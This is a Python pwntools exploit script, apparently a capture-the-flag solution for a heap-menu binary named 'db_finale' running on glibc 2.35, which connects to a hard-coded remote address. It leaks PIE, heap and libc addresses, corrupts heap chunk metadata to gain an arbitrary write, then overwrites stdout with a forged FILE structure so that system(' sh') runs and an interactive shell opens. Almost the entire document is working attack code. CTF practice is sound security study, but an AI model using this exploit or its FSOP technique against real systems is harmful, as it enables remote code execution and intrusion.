from pwn import *
from icecream import ic

elf = exe = ELF("./db_finale")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("223.112.5.141", 60058)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+893
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def alloc(idx):
    sla(b'>>>',b'1')
    sla(b'Index:',str(idx).encode())
    info(f"ALLOC [{idx}]")

def free(idx):
    sla(b'>>>',b'2')
    sla(b'Index:',str(idx).encode())
    info(f"FREE [{idx}]")

def ins(idx,leng,varc):
    sla(b'>>>',b'3')
    sla(b'Index:',str(idx).encode())
    sla(b'Length:',str(leng).encode())
    sa(b'Varchar:',varc)
    info(f"INSERT [{idx}] - {leng}")

def get(idx,slot):
    sla(b'>>>',b'4')
    sla(b'Index:',str(idx).encode())
    sla(b'ID:',str(slot).encode())
    ru(b'Varchar: ')

def edit(idx,slot,leng,varc):
    sla(b'>>>',b'5')
    sla(b'Index:',str(idx).encode())
    sla(b'ID:',str(slot).encode())
    sla(b'Length:',str(leng).encode())
    sa(b'Varchar:',varc)

def write(addr,size,dat):
    ins(0,1021,b'\x04'+b'T'*1020)
    edit(0,0,5+0x438,b'A'*(5+0x3f8)+p64(0)+p64(0x31)+p64(libc.address + 0x21a018)+p64(addr-size)+p64(addr+size)+p64(libc.address + 0x21a018)+p64(0)+p64(0x411))
    # pause()
    ins(8,size,dat)

alloc(0)
ins(0,1021,b'\x08'+cyclic(1020))
get(0,0)
ru(b'\0')
ru(b'!')
leak = ru(b'!')
re(7)
exe.address = u64(re(6).ljust(8,b'\0')) - 0x4c60
heap = u64(leak[15:15+6].ljust(8,b'\0')) - 0x122e3
info(f"PIE: {hex(exe.address)}")
info(f"HEAP: {hex(heap)}")
for i in range(1,9): alloc(i)
for i in range(9): free(i)
alloc(8)
ins(8,1021,b'\x08'+cyclic(1020))
get(8,0)
ru(p64(0x411))
libc.address = u64(re(8)) - 0x1e8b20 - 0x321c0
info(f"LIBC: {hex(libc.address)}")

for i in range(0,9): alloc(i)

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):

    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")

    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

payload = FSOP_struct(flags=u64(b' sh\x00'.ljust(8, b'\x00')), _old_offset = 0xffffffffffffffff, lock = heap+0x400, _offset = 0xffffffffffffffff, _wide_data=libc.sym['_IO_2_1_stdout_']-0x10, _unused2 = p32(0) + p64(libc.sym['system']) + p64(libc.sym['_IO_2_1_stdout_'] + 0x60), vtable=libc.sym['_IO_file_jumps'] - 0x528 - 0x38)
write(libc.sym['_IO_2_1_stdout_'],0x128,payload)
ic(hex(libc.sym['_IO_file_jumps'] - 0x520))
sl(b'ls')

io.interactive()
